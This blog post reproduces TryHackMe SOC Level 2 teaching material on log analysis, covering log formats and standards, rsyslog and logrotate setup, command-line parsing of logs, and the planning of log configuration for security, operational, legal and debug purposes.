---
title: "SOC Lv2"
date: 2024-02-27
draft: false # this section allows the post to be published and be public, is it is set to true the post will not be published.
summary: "Credit to TryHackMe" # Here you can write a small summary of the post if needed
tags: [THM, ]
categories: [Blue Team, TryHackMe]
---


# Introduction

[TryHackMe](https://tryhackme.com/signup?referrer=6325877cfcc474005111479e) provides one of the best contents when it comes to cybersecurity, below is a snippet of the content one will acquire when subcribed to the premium learning path of TryHackMe SOC Level 2.
They have summarised the content very well and clealry understood, for practical experience, subscribe to their platform to gain the skills.


# SOC L2


# LOG ANALYSIS

## Intro to Log

# In the Heart of Data: Logs

Just as a physical tree's rings reveal its life story – indicating 
good years with thick curls and challenging ones with thin – a digital 
log provides a historical record of system activity.

Both embody a fundamental principle of growth over time and serve as
 living records in their respective domains – physical and digital.

In the digital world, every interaction with a computer system – 
from authentication attempts, granting authorisation, accessing a file, 
and connecting to a network to encountering a system error – will always
 leave a digital footprint in the form of logs.

[Untitled Database](SOC%20L2%207205cfa1075b47969372b40e2125686d/Untitled%20Database%2089d4f7fa70224a21965c43cc22fd80ec.csv)

However, since digital interactions are continuous and fast-paced, 
the log file's size may exponentially grow depending on the activities 
logged on a system.

# The True Power of Logs: Contextual Correlation

A single log entry may seem insignificant on its own. But when log 
data is aggregated, analyzed, and cross-referenced with other sources of
 information, it becomes a potent investigation tool. Logs can answer 
critical questions about an event, such as:

- **What** happened?
- **When** did it happen?
- **Where** did it happen?
- **Who** is responsible?
- **Were** their actions **successful**?
- **What** was the result of their action?

The following hypothetical scenario can illustrate this aspect. 
Suppose a student allegedly accessed inappropriate content on a 
University network. By reviewing the logs, a systems administrator could
 then answer the following:

| Question | Answer |
| --- | --- |
| What happened? | An adversary was **confirmed** to have accessed SwiftSpend Financial's GitLab instance. |
| When did it happen? | Access started at 22:10 on Wednesday, September 8th, 2023. |
| Where did it happen? | The event originated from a device with an IP address of
 10.10.133.168 within the VPN Users' segment (10.10.133.0/24). |
| Who is responsible? | Upon examining the network logs, it was observed that 
the device, identified by the User-Agent "Mozilla/5.0 (X11; Ubuntu; 
Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", was allocated the
 IP address 10.10.133.168. |
| Were they successful? | Yes, since an API Key was found to be publicly exposed 
on the GitLab instance. Moreover, the web proxy logs confirm that the 
adversary device reached *gitlab.swiftspend.finance* and maintained access through their uploaded web shell. |
| What is the result of their action? | The adversary achieved remote code execution on *gitlab.swiftspend.finance* and performed post-exploitation activities. |

The example above emphasizes how logs are instrumental in piecing 
together a complete picture of an event, thereby enhancing our 
understanding and ability to respond effectively.

## Types, Formats, and Standards

# Log Types

Specific log types can offer a unique perspective on a system's 
operation, performance, and security. While there are various log types,
 we will focus on the most common ones that cover approximately 80% of 
the typical use cases.

Below is a list of some of the most common log types:

[Untitled Database](SOC%20L2%207205cfa1075b47969372b40e2125686d/Untitled%20Database%20f3ea7d3fedb840febc6a78f22eb56ca7.csv)

Understanding the various log types, formats, and standards is 
critical for practical log analysis. It enables an analyst to 
effectively parse, interpret, and gain insights from log data, 
facilitating troubleshooting, performance optimisation, incident 
response, and threat hunting.

# Log Formats

A log format defines the structure and organisation of data within a
 log file. It specifies how the data is encoded, how each entry is 
delimited, and what fields are included in each row. These formats can 
vary widely and may fall into three main categories: Semi-structured, 
Structured, and Unstructured. We'll explore these categories and 
illustrate their usage with examples.

- **Semi-structured Logs:** These logs may contain
structured and unstructured data, with predictable components
accommodating free-form text. Examples include:
    - **Syslog Message Format:** A widely adopted logging protocol for system and network logs.
        
        Example of a log file utilising the Syslog Format
        
        ```
        damianhall@WEBSRV-02:~/logs$ cat syslog.txtMay 31 12:34:56 WEBSRV-02 CRON[2342593]: (root) CMD ([ -x /etc/init.d/anacron ] && if [ ! -d /run/systemd/system ]; then /usr/sbin/invoke-rc.d anacron start >/dev/null; fi)
        ```
        
    - **Windows Event Log (EVTX) Format:** Proprietary Microsoft log for Windows systems.
        
        Example of a log file utilising the Windows Event Log (EVTX) Format
        
        ```
        PS C:\WINDOWS\system32> Get-WinEvent -Path "C:\Windows\System32\winevt\Logs\Application.evtx"
        
           ProviderName: Microsoft-Windows-Security-SPP
        
        TimeCreated                      Id LevelDisplayName Message
        -----------                      -- ---------------- -------
        31/05/2023 17:18:24           16384 Information      Successfully scheduled Software Protection service for re-start
        31/05/2023 17:17:53           16394 Information      Offline downlevel migration succeeded.
        ```
        
- **Structured Logs:** Following a strict and
standardised format, these logs are conducive to parsing and analysis.
Typical structured log formats include:
    - **Field Delimited Formats:** Comma-Separated Values (CSV) and Tab-Separated Values (TSV) are formats often used for tabular data.
        
        Example of a log file utilising CSV Format
        
        ```
        damianhall@WEBSRV-02:~/logs$ cat log.csv"time","user","action","status","ip","uri"
        "2023-05-31T12:34:56Z","adversary","GET",200,"34.253.159.159","http://gitlab.swiftspend.finance:80/"
        ```
        
    - **JavaScript Object Notation (JSON):** Known for its readability and compatibility with modern programming languages.
        
        Example of a log file utilising the JSON Format
        
        ```
        damianhall@WEBSRV-02:~/logs$ cat log.json{"time": "2023-05-31T12:34:56Z", "user": "adversary", "action": "GET", "status": 200, "ip": "34.253.159.159", "uri": "http://gitlab.swiftspend.finance:80/"}
        ```
        
    - **W3C Extended Log Format (ELF):** Defined by
    the World Wide Web Consortium (W3C), customizable for web server
    logging. It is typically used by Microsoft Internet Information Services (IIS) Web Server.
        
        Example of a log file utilising W3C Extended Log Format (ELF)
        
        ```
        damianhall@WEBSRV-02:~/logs$ cat elf.log#Version: 1.0#Fields: date time c-ip c-username s-ip s-port cs-method cs-uri-stem sc-status31-May-2023 13:55:36 34.253.159.159 adversary 34.253.127.157 80 GET /explore 200
        ```
        
    - **eXtensible Markup Language (XML):** Flexible and customizable for creating standardized logging formats.
        
        Example of a log file utilising an XML Format
        
        ```
        damianhall@WEBSRV-02:~/logs$ cat log.xml<log><time>2023-05-31T12:34:56Z</time><user>adversary</user><action>GET</action><status>200</status><ip>34.253.159.159</ip><url>https://gitlab.swiftspend.finance/</url></log>
        ```
        
- **Unstructured Logs:** Comprising free-form text, these logs can be rich in context but may pose challenges in systematic parsing. Examples include:
    - **NCSA Common Log Format (CLF):** A standardized web server log format for client requests. It is typically used by the Apache HTTP Server by default.
        
        Example of a log file utilising NCSA Common Log Format (CLF)
        
        ```
        damianhall@WEBSRV-02:~/logs$ cat clf.log34.253.159.159 - adversary [31/May/2023:13:55:36 +0000] "GET /explore HTTP/1.1" 200 4886
        ```
        
    - **NCSA Combined Log Format (Combined):** An extension of CLF, adding fields like referrer and user agent. It is typically used by Nginx HTTP Server by default.
        
        Example of a log file utilising NCSA Combined Log Format (Combined)
        
        ```
        damianhall@WEBSRV-02:~/logs$ cat combined.log34.253.159.159 - adversary [31/May/2023:13:55:36 +0000] "GET /explore HTTP/1.1" 200 4886 "http://gitlab.swiftspend.finance/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
        ```
        

**IMPORTANT:** Custom-defined formats can be crafted to meet 
specific applications or use cases. These formats provide flexibility 
but may necessitate specialised parsing tools for effective 
interpretation and analysis.

# Log Standards

A log standard is a set of guidelines or specifications that define 
how logs should be generated, transmitted, and stored. Log standards may
 specify the use of particular log formats, but they also cover other 
aspects of logging, such as what events should be logged, how logs 
should be transmitted securely, and how long logs should be retained. 
Examples of log standards include:

| • [**Common Event Expression (CEE):](https://cee.mitre.org/)** This
 standard, developed by MITRE, provides a common structure for log data,
 making it easier to generate, transmit, store, and analyse logs.
                            
• [**OWASP Logging Cheat Sheet:](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html)** A guide for developers on building application logging mechanisms, especially related to security logging.
                            
• [**Syslog Protocol:](https://datatracker.ietf.org/doc/html/rfc5424)** Syslog
 is a standard for message logging, allowing separation of the software 
that generates messages from the system that stores them and the 
software that reports and analyses them.
                            
• [**NIST Special Publication 800-92:](https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-92.pdf)** This publication guides computer security log management.
                            
• [**Azure Monitor Logs:](https://learn.microsoft.com/en-us/azure/azure-monitor/logs/data-platform-logs)** Guidelines for log monitoring on Microsoft Azure.
                            
• [**Google Cloud Logging:](https://cloud.google.com/logging/docs)** Guidelines for logging on the Google Cloud Platform (GCP).
                            
• [**Oracle Cloud Infrastructure Logging:](https://docs.oracle.com/en-us/iaas/Content/Logging/Concepts/loggingoverview.htm)** Guidelines for logging on the Oracle Cloud Infrastructure (OCI). 
							
• [**Virginia Tech - Standard for Information Technology Logging:](https://it.vt.edu/content/dam/it_vt_edu/policies/Standard_for_Information_Technology_Logging.pdf)** Sample log review and compliance guideline. |  |
| --- | --- |

## Collection, Management, and Centralisation

# Log Collection

Log collection is an essential component of log analysis, involving 
the aggregation of logs from diverse sources such as servers, network 
devices, software, and databases.

For logs to effectively represent a chronological sequence of 
events, it's crucial to maintain the system's time accuracy during 
logging. Utilising the **Network Time Protocol (NTP)** is a method to achieve this synchronisation and ensure the integrity of the timeline stored in the logs.

As this is a foundational step to ensuring that a security analyst 
would have a comprehensive data set to review, the following is a simple
 step-by-step process to achieving this, bearing in mind the need to 
prioritise the collection based on significant information:

- **Identify Sources:** List all potential log sources, such as servers, databases, applications, and network devices.
- **Choose a Log Collector:** Opt for a suitable log collector tool or software that aligns with your infrastructure.
- **Configure Collection Parameters:** Ensure that time
synchronisation is enabled through NTP to maintain accurate timelines,
adjust settings to determine which events to log at what intervals, and
prioritise based on importance.
- **Test Collection:** Once configured, run a test to ensure logs are appropriately collected from all sources.

**IMPORTANT:** Please be aware that NTP-based time 
synchronisation may not be possible to replicate with the VM since it 
has no internet connectivity. However, when performing this in practice,
 using **pool.ntp.org** to find an NTP server is best. Time 
synchronisation can be performed automatically on Linux-based systems or
 manually initiated by executing. `ntpdate pool.ntp.org`.

Example of Time Synchronisation with NTP on a Linux-based System

```
root@WEBSRV-02:~# ntpdate pool.ntp.org12 Aug 21:03:44 ntpdate[2399365]: adjust time server 85.91.1.180 offset 0.000060 sec
root@WEBSRV-02:~# dateSaturday, 12 August, 2023 09:04:55 PM UTC
root@WEBSRV-02:~#
```

# Log Management

Efficient Log Management ensures that every gathered log is stored 
securely, organised systematically, and is ready for swift retrieval. A 
hybrid approach can provide a balanced solution by hoarding all log 
files and selectively trimming.

Once you've collated your logs, effective management of them is paramount. These steps can be followed to achieve this:

- **Storage:** Decide on a secure storage solution, considering factors like retention period and accessibility.
- **Organisation:** Classify logs based on their source, type, or other criteria for easier access later.
- **Backup:** Regularly back up your logs to prevent data loss.
- **Review:** Periodically review logs to ensure they are correctly stored and categorised.

# Log Centralisation

Centralisation is pivotal for swift log access, in-depth analysis, 
and rapid incident response. A unified system allows for efficient log 
management with tools that offer real-time detection, automatic 
notifications, and seamless integration with incident management 
systems.

Centralising your logs can significantly streamline access and analysis. Here's a simple process for achieving it:

- **Choose a Centralised System:** Opt for a system that consolidates logs from all sources, such as the Elastic Stack or Splunk.
- **Integrate Sources:** Connect all your log sources to this centralised system.
- **Set Up Monitoring:** Utilise tools that provide real-time monitoring and alerts for specified events.
- **Integration with Incident Management:** Ensure that your centralised system can integrate seamlessly with any incident management tools or protocols you have in place.

# Practical Activity: Log Collection with rsyslog

This activity aims to introduce `rsyslog` and demonstrate
 how it can enhance the centralisation and management of logs. As part 
of the collection process, we will configure `rsyslog` to log all sshd messages to a specific file, such as `/var/log/websrv-02/rsyslog_sshd.log`. The steps below can be followed to achieve this:

1. **Open a Terminal.**
2. **Ensure rsyslog is Installed:** You can check if rsyslog is installed by running the command: `sudo systemctl status rsyslog`
3. **Create a Configuration File:** Use a text editor to create the following configuration file: `gedit /etc/rsyslog.d/98-websrv-02-sshd.conf`, `nano /etc/rsyslog.d/98-websrv-02-sshd.conf`, `vi /etc/rsyslog.d/98-websrv-02-sshd.conf`, or `vim /etc/rsyslog.d/98-websrv-02-sshd.conf`
4. **Add the Configuration:** Add the following lines in `/etc/rsyslog.d/98-websrv-02-sshd.conf` to direct the sshd messages to the specific log file:
    
    ```yaml
    $FileCreateMode 0644
    :programname, isequal, "sshd" /var/log/websrv-02/rsyslog_sshd.log
    ```
    
5. **Save and Close the Configuration File.**
6. **Restart rsyslog:** Apply the changes by restarting rsyslog with the command: `sudo systemctl restart rsyslog`
7. **Verify the Configuration:** You can verify the configuration works by initiating an SSH connection to localhost via `ssh localhost` or by checking the log file after a minute or two.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/63da722f2d207d0049da10b1/room-content/541d9cd9d9bc4487ee7f6cbd2390f406.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/63da722f2d207d0049da10b1/room-content/541d9cd9d9bc4487ee7f6cbd2390f406.png)

**IMPORTANT:** If remote forwarding of logs is not configured, tools such as `scp` / `rsync`, among others, can be utilised for the manual collection of logs.

## Storage, Retention, and Deletion

# Log Storage

Logs can be stored in various locations, such as the local system 
that generates them, a centralised repository, or cloud-based storage.

The choice of storage location typically depends on multiple factors:

[Untitled Database](SOC%20L2%207205cfa1075b47969372b40e2125686d/Untitled%20Database%20f4dff1cd775a41f498200510fd2800ac.csv)

# Log Retention

It is vital to recognise that log storage is not infinite. 
Therefore, a reasonable balance between retaining logs for potential 
future needs and the storage cost is necessary. Understanding the 
concepts of Hot, Warm, and Cold storage can aid in this decision-making:

[Untitled Database](SOC%20L2%207205cfa1075b47969372b40e2125686d/Untitled%20Database%2068338ed28332435387d29c9278a22b03.csv)

Managing the cost of storing logs is critical for organisations, and
 carefully selecting Hot, Warm, or Cold storage strategies can help keep
 these costs in check.

# Log Deletion

Log deletion must be performed carefully to avoid removing logs that
 could still be of value. The backup of log files, especially crucial 
ones, is necessary before deletion.

It is essential to have a well-defined deletion policy to ensure 
compliance with data protection laws and regulations. Log deletion helps
 to:

- Maintain a manageable size of logs for analysis.
- Comply with privacy regulations, such as GDPR, which require unnecessary data to be deleted.
- Keep storage costs in balance.

# Best Practices: Log Storage, Retention and Deletion

- Determine the storage, retention, and deletion policy based on both business needs and legal requirements.
- Regularly review and update the guidelines per changing conditions and regulations.
- Automate the storage, retention, and deletion processes to ensure consistency and avoid human errors.
- Encrypt sensitive logs to protect data.
- Regular backups should be made, especially before deletion.

# Practical Activity: Log Management with logrotate

This activity aims to introduce `logrotate`, a tool that 
automates log file rotation, compression, and management, ensuring that 
log files are handled systematically. It allows automatic rotation, 
compression, and removal of log files. As an example, here's how we can 
set it up for `/var/log/websrv-02/rsyslog_sshd.log`:

1. **Create a Configuration File:** `sudo gedit /etc/logrotate.d/98-websrv-02_sshd.conf`, `sudo nano /etc/logrotate.d/98-websrv-02_sshd.conf`, `sudo vi /etc/logrotate.d/98-websrv-02_sshd.conf`, or `sudo vim /etc/logrotate.d/98-websrv-02_sshd.conf`
2. **Define Log Settings:** 

`/var/log/websrv-02/rsyslog_sshd.log {
    daily
    rotate 30
    compress
    lastaction
        DATE=$(date +"%Y-%m-%d")
        echo "$(date)" >> "/var/log/websrv-02/hashes_"$DATE"_rsyslog_sshd.txt"
        for i in $(seq 1 30); do
            FILE="/var/log/websrv-02/rsyslog_sshd.log.$i.gz"
            if [ -f "$FILE" ]; then
                HASH=$(/usr/bin/sha256sum "$FILE" | awk '{ print $1 }')
                echo "rsyslog_sshd.log.$i.gz "$HASH"" >> "/var/log/websrv-02/hashes_"$DATE"_rsyslog_sshd.txt"
            fi
        done
        systemctl restart rsyslog
    endscript
}`
3. **Save and Close the file.**
4. **Manual Execution:** `sudo logrotate -f /etc/logrotate.d/98-websrv-02_sshd.conf`

![https://tryhackme-images.s3.amazonaws.com/user-uploads/63da722f2d207d0049da10b1/room-content/504e02458a483779036168dd88b0e49a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/63da722f2d207d0049da10b1/room-content/504e02458a483779036168dd88b0e49a.png)

Log analysis process, tools, and techniques

Logs are more than mere records of historical events; they can serve
 as a guiding compass. They are invaluable resources that, when 
skillfully leveraged, can enhance system diagnostics, cyber security, 
and regulatory compliance efforts. Their role in keeping a record of 
historical activity for a system or application is crucial.

# Log Analysis Process

Log analysis involves Parsing, Normalisation, Sorting, 
Classification, Enrichment, Correlation, Visualisation, and Reporting. 
It can be done through various tools and techniques, ranging from 
complex systems like Splunk and ELK to ad-hoc methods ranging from 
default command-line tools to open-source tools.

[Untitled Database](SOC%20L2%207205cfa1075b47969372b40e2125686d/Untitled%20Database%20ba13ad907aba4150ad856bf5ada2c3f1.csv)

# Log Analysis Tools

Security Information and Event Management (SIEM) tools such as 
Splunk or Elastic Search can be used for complex log analysis tasks.

However, in scenarios where immediate data analysis is needed, such 
as during incident response, Linux-based systems can employ default 
tools like `cat`, `grep`, `sed`, `sort`, `uniq`, and `awk`, along with `sha256sum` for hashing log files. Windows-based systems can utilise [EZ-Tools](https://ericzimmerman.github.io/#!index.md) and the default cmdlet `Get-FileHash` for similar purposes. These tools enable rapid parsing and analysis, which suits these situations.

Additionally, proper acquisition should be observed by taking the log file's **hash during collection** to ensure its admissibility in a court of law.

Therefore, it is imperative not only to log events but also to 
ensure their integrity, that they are analysed, and any lessons obtained
 from the logs be learned, as the safety and efficiency of an 
organisation can depend on them.

# Log Analysis Techniques

Log analysis techniques are methods or practices used to interpret 
and derive insights from log data. These techniques can range from 
simple to complex and are vital for identifying patterns, anomalies, and
 critical insights. Here are some common techniques:

**Pattern Recognition:** This involves identifying recurring 
sequences or trends in log data. It can detect regular system behaviour 
or identify unusual activities that may indicate a security threat.

**Anomaly Detection:** Anomaly detection focuses on identifying 
data points that deviate from the expected pattern. It is crucial to 
spot potential issues or malicious activities early on.

**Correlation Analysis:** Correlating different log entries helps
 understand the relationship between various events. It can reveal 
causation and dependencies between system components and is vital in 
root cause analysis.

**Timeline Analysis:** Analysing logs over time helps understand 
trends, seasonalities, and periodic behaviours. It can be essential for 
performance monitoring and forecasting system loads.

**Machine Learning and AI:** Leveraging machine learning models 
can automate and enhance various log analysis techniques, such as 
classification and enrichment. AI can provide predictive insights and 
help in automating responses to specific events.

**Visualisation:** Representing log data through graphs and 
charts allows for intuitive understanding and quick insights. 
Visualisation can make complex data more accessible and assist in 
identifying key patterns and relationships.

**Statistical Analysis:** Using statistical methods to analyse 
log data can provide quantitative insights and help make data-driven 
decisions. Regression analysis and hypothesis testing can infer 
relationships and validate assumptions.

These techniques can be applied individually or in combination, 
depending on the specific requirements and complexity of the log 
analysis task. Understanding and using these techniques can 
significantly enhance the effectiveness of log analysis, leading to more
 informed decisions and robust security measures.

# Working with Logs: Practical Application

Working with logs is a complex task requiring both comprehension and
 manipulation of data. This tutorial covers two scenarios. The first is 
handling unparsed raw log files accessed directly via an open-source [Log Viewer](https://github.com/sevdokimov/log-viewer)
 tool. This method allows immediate analysis without preprocessing, 
which is ideal for quick inspections or preserving the original format.

The second scenario focuses on creating a parsed and consolidated log file using Unix tools like `cat`, `grep`, `sed`, `sort`, `uniq`, and `awk`. It involves merging, filtering, and formatting logs to create a standardised file. Accessible through the [Log Viewer](https://github.com/sevdokimov/log-viewer) tool, this consolidated file offers a clear and efficient view of the data, aiding in identifying patterns and issues.

These approaches highlight the flexibility and significance of log 
analysis in system diagnostics and cyber security. Whether using raw or 
parsed logs, the ability to compile, view, and analyse data is vital for
 an organisation's safety and efficiency.

Unparsed Raw Log Files

When dealing with raw log files, you can access them directly 
through the Log Viewer tool by specifying the paths in the URL. Here's 
an example URL that includes multiple log files:

```yaml
http://10.10.246.72:8111/log?log=%2Fvar%2Flog%2Fgitlab%2Fnginx%2Faccess.log&log=%2Fvar%2Flog%2Fwebsrv-02%2Frsyslog_cron.log&log=%2Fvar%2Flog%2Fwebsrv-02%2Frsyslog_sshd.log&log=%2Fvar%2Flog%2Fgitlab%2Fgitlab-rails%2Fapi_json.log
```

Paste this URL into your browser to view the unparsed raw log files using the [Log Viewer](https://github.com/sevdokimov/log-viewer) tool.

**NOTE:** You can access the URL using the AttackBox or VM 
browser. However, please be aware that Firefox on the VM may take a few 
minutes to boot up.

Parsed and Consolidated Log File

To create a parsed and consolidated log file, you can use a combination of Unix tools like `cat`, `grep`, `sed`, `sort`, `uniq`, and `awk`. Here's a step-by-step guide:

1. Use `awk` and `sed` to normalize the log entries to the desired format. For this example, we will sort by date and time:
    
    ```yaml
    # Process nginx access log
    awk -F'[][]' '{print "[" $2 "]", "--- /var/log/gitlab/nginx/access.log ---", "\"" $0 "\""}' /var/log/gitlab/nginx/access.log  | sed "s/ +0000//g" > /tmp/parsed_consolidated.log
    
    # Process rsyslog_cron.log
    awk '{ original_line = $0; gsub(/ /, "/", $1); printf "[%s/%s/2023:%s] --- /var/log/websrv-02/rsyslog_cron.log --- \"%s\"\n", $2, $1, $3, original_line }' /var/log/websrv-02/rsyslog_cron.log >> /tmp/parsed_consolidated.log
    
    # Process rsyslog_sshd.log
    awk '{ original_line = $0; gsub(/ /, "/", $1); printf "[%s/%s/2023:%s] --- /var/log/websrv-02/rsyslog_sshd.log --- \"%s\"\n", $2, $1, $3, original_line }' /var/log/websrv-02/rsyslog_sshd.log >> /tmp/parsed_consolidated.log
    
    # Process gitlab-rails/api_json.log
    awk -F'"' '{timestamp = $4; converted = strftime("[%d/%b/%Y:%H:%M:%S]", mktime(substr(timestamp, 1, 4) " " substr(timestamp, 6, 2) " " substr(timestamp, 9, 2) " " substr(timestamp, 12, 2) " " substr(timestamp, 15, 2) " " substr(timestamp, 18, 2) " 0 0")); print converted, "--- /var/log/gitlab/gitlab-rails/api_json.log ---", "\""$0"\""}' /var/log/gitlab/gitlab-rails/api_json.log >> /tmp/parsed_consolidated.log
    ```
    
2. **Optional:** Use `grep` to filter specific entries:
    
    ```yaml
    grep "34.253.159.159" /tmp/parsed_consolidated.log > /tmp/filtered_consolidated.log
    ```
    
3. Use `sort` to sort all the log entries by date and time:
    
    ```yaml
    sort /tmp/parsed_consolidated.log > /tmp/sort_parsed_consolidated.log
    ```
    
4. Use `uniq` to remove duplicate entries:
    
    ```yaml
    uniq /tmp/sort_parsed_consolidated.log > /tmp/uniq_sort_parsed_consolidated.log
    ```
    

You can now access the parsed and consolidated log file through the [Log Viewer](https://github.com/sevdokimov/log-viewer) tool using the following URL:

```yaml
http://10.10.246.72:8111/log?path=%2Ftmp%2Funiq_sort_parsed_consolidated.log
```

![https://tryhackme-images.s3.amazonaws.com/user-uploads/63da722f2d207d0049da10b1/room-content/5ef64ce6f3e0eaf396d91cf2409c473f.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/63da722f2d207d0049da10b1/room-content/5ef64ce6f3e0eaf396d91cf2409c473f.png)

**NOTE:** You can access the URL using the AttackBox or VM 
browser. However, please be aware that Firefox on the VM may take a few 
minutes to boot up.

In summary, we were able to learn and perform the following:

- The significance of logs as records of past activities; essential for pinpointing and tackling threats.
- Delve into an array of logs, their creation techniques, and the methods of gathering them from diverse systems.
- Review the results from analysing logs in the realms of detection engineering and incident handling.
- Acquire practical skills in identifying and countering adversaries via log analysis.

If you enjoyed this room, continue learning and developing 
proficiency in areas specific to Security Operations and Incident 
Response tooling, which may enhance your log analysis and overall Blue 
Teaming skills such as the following:

[Untitled Database](SOC%20L2%207205cfa1075b47969372b40e2125686d/Untitled%20Database%20f3d8e8f2cdba4a178752064286fed4aa.csv)

Recognising that these security tools truly flourish in the hands of 
skilled individuals with the necessary information and technical 
expertise to combat potential threats and manage security incidents is 
vital.

# Next Steps

As we conclude, we hope this exploration has instilled in you the 
importance and potential of logs. Now that you've comprehensively 
understood what logs are, why logging matters and how logging is 
performed, it's time to proceed to the next room, [Log Operations](https://tryhackme.com/room/logoperations). May you harness this knowledge to fortify defences, detect adversaries, and drive your cyber security endeavours forward.

**Log Configuration**

**Log Configuration Options**

"Do
 you dare to configure your logs, or are you happy to be lost in the 
madness of the thousands of lines?" In log operations, there are 
multiple concerns about configuration approaches, and identifying the 
suitable configuration approach could be a pain point.

Log
 configuration is a multifaceted operation that addresses security, 
operational stability, regulatory compliance, and debugging needs. 
Adequately configured logs are crucial in cyber security, operational 
efficiency, regulatory compliance, and software development, providing 
organisations with comprehensive system, asset, and resource management 
statistics. Let's look at and understand the scopes and differences of 
common purposes of log configuration.

**SECURITY**

**OPERATIONAL**

**LEGAL**

**DEBUG**

# Security Purposes

Logging
 and configuration for security purposes are typically planned to detect
 and respond to anomalies and security issues. For example, 
configuration to verify the authenticity of user activity to ensure 
authorisation control and timely detection of unauthorised access. The 
main focus areas of this approach are:

- Anomaly and threat detection
- Logging user authentication data
- Ensuring the system's integrity and data confidentiality

# Operational Purposes

Logging
 and configuring for operational purposes is usually planned to detect 
and respond to system errors and identify action points to enhance the 
system's performance, continuity, and reliability. The main focus areas 
of this approach are:

- Proactively creating reports and notifications for on-system and component status
- Troubleshooting
- Capacity planning
- Service billing

# Legal Purposes

Logging
 and configuring for legal purposes is similar to security purposes; it 
is usually planned to stay compliant and increase the alignment with 
regulations and obligations. Here, the laws, regulations, and compliance
 standards will vary depending on the work's scope, the data being 
processed, and the service area being provided. Therefore, each 
enrollment will come with a set of responsibilities and guidelines to 
follow. The main focus areas of this approach are:

- Alignment with standards, compliance, regulations, and laws
    - E.g. ISO 27001, COBIT, GDPR, PCI DSS, HIPAA, FISMA

**Legal Compliance Example:** A
 company must have an active central log management system, adequate log
 configuration, 12-month log retention for logs and affiliated system 
logs (last three months data must always be ready to search), system and
 component security checks, and overall yearly audit checks to meet PCI 
logging compliance.

# Debug Purposes

Logging
 and configuring for debug purposes is usually planned to boost the 
system's reliability and enhance provided features by discovering the 
bugs and potential fault conditions. This configuration scope is not 
always implemented in the production environment and is mostly used for 
testing and developing purposes. The main focus areas of this approach 
are:

- Increasing visibility for the application debugging
- Enhancing efficiency
- Speeding up the development process

**Where To Start After Deciding the Logging Purpose**

# Where To Start and What To Do After Deciding the Log Purpose?

If
 you already have an objective and scope plan but need help knowing how 
and where to start, you can use the meeting and brainstorming methods 
with your team. The meeting might sound like a passive action, but it 
will start the ball rolling for brainstorming, which will help consider 
multiple aspects and create a draft plan.

Remember,
 each log configuration purpose is planned and implemented to fulfil a 
different goal. Questioning is one of the most common ways to identify 
needs and facilitate planning. Remember, each implementation is unique, 
but common base questions must be answered in almost any log 
configuration planning session. You can use the following questions as a
 starting point and broaden the list according to the answers. Remember,
 you will need additional steps like creating a detailed plan, choosing 
tools/technologies, establishing monitoring and review/analysis 
processes after answering the initial questions.

**Questions To Ask In Planning Meeting/Session**

- What will you log, and for what (asset scope and logging purpose)?
    - Is additional commitment or effort required to achieve the purpose (requirements related to the purpose)?
- How much are you going to log (detail scope)?
- How much do you need to log?
- How are you going to log (collection)?
- How are you going to store collected logs?
    - Is there a standard, process, legislation, or law that you must comply with due to the data you log?
- How are you going to protect the logs?
- How are you going to analyse collected logs?
- Do you have enough resources and workforce to do logging?
- Do you have enough budget to plan, implement and maintain logging?

**Configuration Dilemma: Planning and Implementation**

# Configuration Dilemma: Requirements, Aspirations, Resources, and Investment

Configuration
 dilemma reflects the challenges of implementation. As highlighted in 
the previous task, each log configuration scope comes with 
responsibilities, guidelines, and challenges. This means that the log 
configuration and logging are more than a simple practice of enabling 
logging from the assets and surviving among thousands of lines.

Each
 log configuration plan results from a unique analysis of the scope, 
assets, objectives, requirements, and expectations to be applied. 
Expectations, requirements, and limits are determined with the 
involvement of system administrators, legal and financial advisors, and 
managers, if possible. In summary, the main source of the dilemma is 
finding the balance between requirements, scope, details, and price 
(financial and labour costs, risks, and investment). During the meeting,
 there might be some points where participants get off the point, but it
 is vital to keep in mind that the main objective of the meeting is:

- Meeting specific operational and security requirements (non-negotiable) while
also considering the feasibility of improving the capability by
implementing additional data and insights.

Last
 but not least, a comprehensive risk assessment, prioritising security, 
compliance, and legal needs will be helpful to navigate this dilemma. 
Finding the balance in "operational and management" level decisions and 
achieve secure, efficient, proactive, resilient, and sustainable 
outcomes in the ever-evolving threat/IT landscape and technical 
operations.

# Translating "Requirements" and "Aspirations" To Operational Level

Let's take a closer look at exactly how the dilemma arose.

| **Base Requirements** | **Aspirations for Better Insights** |
| --- | --- |
| • What happened?
• When did it happen?
    ◦ With time data (if possible).
• Where did it happen?
    ◦ Network, system, folder, path, interface.
• Who/What caused it to occur?
• From which log source? | • Is it possible to have more data?
    ◦ More details.
• How sure can I be that this is true?
• What is affected?
• What will happen next?
• Is there anything else that requires attention?
• What should I do about the incident? |

While the main focus is the same, two question sets represent two distinct dimensions of logging and analysis:

- The base part heavily relies on an incident detection mindset. Still, it
provides a solid framework for logging and analysis but is reactive. The requirements are a good place to start, but it is primarily helpful
against known threats.
- The
aspirations part is more focused on a threat-hunting mindset. Therefore, it is proactive and requires more resources due to the need to go above and beyond. Therefore, this part is more helpful against advanced and
sophisticated threats.

The 
baseline part is necessary for a solid incident detection and response 
scope foundation. However, adopting proactive aspirations by adding them
 to the operational vision is strongly recommended, given the 
ever-evolving threat landscape.

**Principles and Difficulties**

# Logging Principles

Logging
 is a critical aspect of the cyber-security and IT operations. It is a 
process that is as burdensome as functional and requires active resource
 utilisation. Therefore, it is crucial to implement a proper logging 
operation and ensure its effectiveness and efficiency. There are 
multiple principles which help achieve the mentioned goal. The table 
below highlights some of the essentials.

| **Collection** | • Define the logging purpose.
• Collect what you will need and use.
• Do not collect irrelevant data.
• Avoid log noise. |
| --- | --- |
| **Format** | • Log at the correct level and detail.
• Implement a consistent log format.
• Ensure that timestamps in logs are accurate and synchronised. |
| **Archiving and Accessibility** | • Define log retention policies and implement them.
• Store log data and make sure the important part is available for analysis. 
• Create backups of stored log data and used systems. |
| **Monitoring and Alerting** | • Create alerts and notifications for important and noteworthy cases.
• Focus on actionable alerts and avoid noise. |
| **Security** | • Protect logs by implementing access controls.
• Implement encryption if required.
• Use a dedicated log management solution. |
